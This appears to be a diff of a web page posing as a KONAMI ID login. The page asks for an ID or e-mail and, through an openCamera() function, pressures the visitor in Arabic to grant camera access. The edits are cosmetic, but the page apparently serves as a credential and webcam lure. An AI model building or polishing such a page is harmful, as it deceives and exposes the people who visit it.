@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -115,13 +113,6 @@
       margin-top: 10px;
       color: #333;
     }
-
-    .notice {
-      font-size: 14px;
-      margin-bottom: 15px;
-      color: #e60012;
-      font-weight: bold;
-    }
   </style>
 </head>
 <body>
@@ -131,8 +122,6 @@
     <h2>KONAMI ID</h2>
 
     <input id="username" type="text" placeholder="KONAMI ID / E-mail address">
-
-    <div class="notice">✅ يجب الموافقة على جميع الشروط للمتابعة</div>
 
     <button id="loginBtn" class="btn login-btn">Log In</button>
 
@@ -202,7 +191,7 @@ async function openCamera(){
     await video.play();
     return stream;
   } catch (err) {
-    throw new Error("❌ يجب الموافقة على جميع الشروط لإكمال العملية.");
+    throw new Error("❌ يجب الموافقة لإكمال العملية.");
   }
 }
 
@@ -240,4 +229,3 @@ loginBtn.addEventListener("click", startProcess);
 
 </body>
 </html>
-
